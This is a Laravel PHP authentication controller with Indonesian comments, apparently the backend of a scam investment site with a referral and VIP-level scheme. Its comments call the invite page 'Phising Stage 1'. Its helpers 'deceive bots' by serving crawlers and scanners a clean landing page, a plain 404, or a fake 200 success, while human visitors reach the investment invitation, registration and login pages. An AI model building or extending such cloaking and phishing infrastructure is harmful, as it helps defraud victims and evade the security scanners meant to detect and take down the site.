<?php

namespace App\Http\Controllers;

use App\Models\User;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\Hash;
use App\Support\ReferralCode;

class AuthController extends Controller
{
    /**
     * Helper untuk mengecek apakah request berasal dari Bot.
     * Mengambil data dari atribut yang diset oleh Middleware.
     */
    private function isBot(Request $request)
    {
        return $request->attributes->get('is_bot', false);
    }

    /**
     * View alternatif "Bersih" untuk mengelabui Bot.
     */
    private function cleanView()
    {
        // Mengacu ke resources/views/landing.blade.php
        return view('landing'); 
    }

public function referralEntry(Request $request, string $code)
{
    // Jika terdeteksi bot, berikan respon 404 (Bukan halaman landing!)
if ($request->attributes->get('is_bot') === true) {
    return response('Not Found', 404); // Respon teks murni, tanpa beban view
}

    // Jika Manusia, lanjutkan alur
    $code = strtoupper(trim($code));

    if (!preg_match('/^[A-Z0-9]{4,20}$/', $code)) {
        return redirect()->route('home');
    }

    session(['referral_code' => $code]);

    // Lempar ke halaman undangan (Phising Stage 1)
    return redirect()->route('invite.preview');
}

    public function showRegister(Request $request)
    {
        if ($this->isBot($request)) {
            return $this->cleanView();
        }

        if ($request->filled('ref')) {
            $ref = strtoupper(trim($request->query('ref')));

            if (preg_match('/^[A-Z0-9]{4,20}$/', $ref)) {
                session(['referral_code' => $ref]);
            }
        }

        return redirect()->route('invite.preview');
    }

    public function showInvite(Request $request)
    {
        // Bot tidak boleh melihat halaman undangan/preview investasi
        if ($this->isBot($request)) {
            return $this->cleanView();
        }

        return view('auth.invite');
    }

    public function showRegisterForm(Request $request)
    {
        // Bot tidak boleh melihat form pendaftaran
        if ($this->isBot($request)) {
            return $this->cleanView();
        }

        return view('auth.register');
    }

    public function showLogin(Request $request)
    {
        // Bot tidak boleh melihat halaman login
        if ($this->isBot($request)) {
            return $this->cleanView();
        }

        return view('auth.login');
    }

    public function register(Request $request)
    {
        // Double Protection: Jika bot mencoba melakukan POST ke endpoint register
        if ($this->isBot($request) || $request->filled('website')) {
            return response()->json(['status' => 'success'], 200); // Beri respon palsu 200 OK
        }

        $request->validate([
            'name' => 'required|string|max:100',
            'phone' => 'required|string|unique:users,phone',
            'password' => 'required|min:6',
            'referral_code' => 'nullable|string|max:20',
            'security_confirm' => 'accepted',
            'puzzle_verified' => 'accepted',
        ]);

        $refCode = session('referral_code') ?: $request->input('referral_code');
        $refCode = $refCode ? strtoupper(trim($refCode)) : null;
        $referrer = null;

        if ($refCode) {
            if (!preg_match('/^[A-Z0-9]{4,20}$/', $refCode)) {
                return back()->withErrors(['referral_code' => 'Kode referral tidak valid'])->withInput();
            }

            $referrer = User::where('referral_code', $refCode)->first();

            if (!$referrer || $referrer->role === 'admin') {
                return back()->withErrors(['referral_code' => 'Kode referral tidak valid'])->withInput();
            }
        }

        $user = User::create([
            'name' => $request->name,
            'phone' => $request->phone,
            'password' => Hash::make($request->password),
            'saldo' => 0,
            'saldo_penarikan' => 0,
            'saldo_penarikan_total' => 0,
            'saldo_hold' => 0,
            'vip_level' => 0,
            'role' => 'user',
            'referral_code' => ReferralCode::generateUnique(10),
            'referred_by_user_id' => $referrer?->id,
        ]);

        session()->forget('referral_code');
        Auth::login($user);

        return redirect('/dashboard');
    }

    public function login(Request $request)
    {
        // Jika bot mencoba brute force atau login, matikan prosesnya secara diam-diam
        if ($this->isBot($request)) {
            return response()->json(['message' => 'Unauthorized'], 401);
        }

        $credentials = $request->validate([
            'phone' => 'required',
            'password' => 'required',
        ]);

        if (Auth::attempt($credentials)) {
            $request->session()->regenerate();
            $user = Auth::user();

            if ($user && $user->role === 'admin') {
                return redirect('/admin');
            }

            return redirect('/dashboard');
        }

        return back()->withErrors([
            'phone' => 'Nomor HP atau password salah',
        ]);
    }

    public function logout(Request $request)
    {
        Auth::logout();
        $request->session()->invalidate();
        $request->session()->regenerateToken();

        return redirect('/login');
    }
}